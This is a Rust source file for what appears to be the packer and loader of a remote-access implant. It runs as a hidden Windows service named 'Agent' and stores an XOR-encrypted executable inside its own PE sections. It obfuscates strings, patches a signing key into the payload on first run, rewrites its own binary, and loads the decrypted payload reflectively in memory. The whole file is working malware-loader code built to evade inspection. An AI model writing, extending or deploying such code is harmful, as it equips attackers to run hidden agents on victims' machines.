#![windows_subsystem = "windows"]
use std::{env, fs, time::Duration};

use common::crypto;
use object::{
    pe::ImageNtHeaders64, read::pe::PeFile, LittleEndian, Object as _, ObjectSection as _,
};
use windows_service::{
    service::{
        ServiceControl, ServiceControlAccept, ServiceExitCode, ServiceState, ServiceStatus,
        ServiceType,
    },
    service_control_handler::{self, ServiceControlHandlerResult},
};

windows_service::define_windows_service!(ffi_service_main, service_main);

#[link_section = "keygen"]
#[used]
static mut KEYGEN: bool = true;

#[link_section = "bin"]
#[used]
static mut BYTES: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/agent_xor")); // Reference stored in .bin, data stored in .rdata
static XOR_KEY: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/xor_key"));

const SERVICE_NAME: &str = "Agent";

// TODO Separate the service code from the packer code
fn service_main(_arguments: Vec<std::ffi::OsString>) {
    // Register system service event handler
    let status_handle = service_control_handler::register(
        SERVICE_NAME,
        move |control_event| -> ServiceControlHandlerResult {
            match control_event {
                ServiceControl::Stop | ServiceControl::Interrogate => {
                    ServiceControlHandlerResult::NoError
                }
                _ => ServiceControlHandlerResult::NotImplemented,
            }
        },
    )
    .unwrap();

    // Tell the system that the service is running now
    status_handle
        .set_service_status(ServiceStatus {
            service_type: ServiceType::OWN_PROCESS,
            current_state: ServiceState::Running,
            controls_accepted: ServiceControlAccept::STOP,
            exit_code: ServiceExitCode::Win32(0),
            checkpoint: 0,
            wait_hint: Duration::default(),
            process_id: None,
        })
        .unwrap();

    unsafe { load().unwrap() }
}

fn section_file_range(file: &PeFile<ImageNtHeaders64>, name: &str) -> Option<(u64, u64)> {
    return file.sections().filter(|s| s.name().is_ok()).find_map(|s| {
        if s.name() == Ok(name) {
            s.file_range()
        } else {
            None
        }
    });
}

fn rva_to_file_offset(file: &PeFile<ImageNtHeaders64>, rva: u64) -> u64 {
    let section_header = file
        .section_by_name(obfstr::obfstr!(".rdata"))
        .unwrap()
        .pe_section();
    let rdata_va = section_header.virtual_address.get(LittleEndian);
    let rdata_raw_addr = section_header.pointer_to_raw_data.get(LittleEndian);
    let base = file.relative_address_base();
    rva - base - rdata_va as u64 + rdata_raw_addr as u64
}

// TODO Write this code in a section that will be removed after first execution
#[allow(static_mut_refs)]
unsafe fn load() -> Result<(), Box<dyn std::error::Error>> {
    let agent_bin = if KEYGEN {
        let exe = env::current_exe()?;
        let mut buf = fs::read(&exe)?;
        let clone = buf.clone();
        let pe = PeFile::<ImageNtHeaders64>::parse(&clone)?;

        // Modify the agent
        let (offset, size) = section_file_range(&pe, obfstr::obfstr!("bin")).unwrap();
        let bin_section = &buf[offset as usize..][..size as usize];
        let addr = <&[u8] as TryInto<[u8; 8]>>::try_into(&bin_section[..8])?;
        let addr = rva_to_file_offset(&pe, u64::from_le_bytes(addr));
        let size = <&[u8] as TryInto<[u8; 8]>>::try_into(&bin_section[8..])?;
        let size = usize::from_le_bytes(size);
        let agent_slice = common::unpack(&mut buf[addr as usize..][..size], XOR_KEY);

        let agent_clone = agent_slice.to_vec();
        let agent_pe = PeFile::<ImageNtHeaders64>::parse(&agent_clone)?;
        let (offset, size) = section_file_range(&agent_pe, obfstr::obfstr!(".sk")).unwrap();
        agent_slice[offset as usize..][..size as usize]
            .copy_from_slice(crypto::get_signing_key().as_bytes());
        let agent_unpacked = agent_slice.to_vec();
        common::pack(agent_slice, XOR_KEY);

        // Set the keygen flag to false
        let (offset, _) = section_file_range(&pe, obfstr::obfstr!("keygen")).unwrap();
        *buf[offset as usize..].get_mut(0).unwrap() = 0;

        // Replace the current executable with the updated one
        let tmp = exe.with_extension("tmp");
        fs::write(&tmp, &buf)?;
        self_replace::self_replace(&tmp)?;
        fs::remove_file(&tmp)?;

        agent_unpacked
    } else {
        common::unpack_clone(&BYTES, XOR_KEY)
    };
    rspe::reflective_loader(agent_bin);
    Ok(())
}

// TODO Fix bug: two processes are created instead of one
fn main() -> Result<(), Box<dyn std::error::Error>> {
    windows_service::service_dispatcher::start(SERVICE_NAME, ffi_service_main)?;
    Ok(())
}
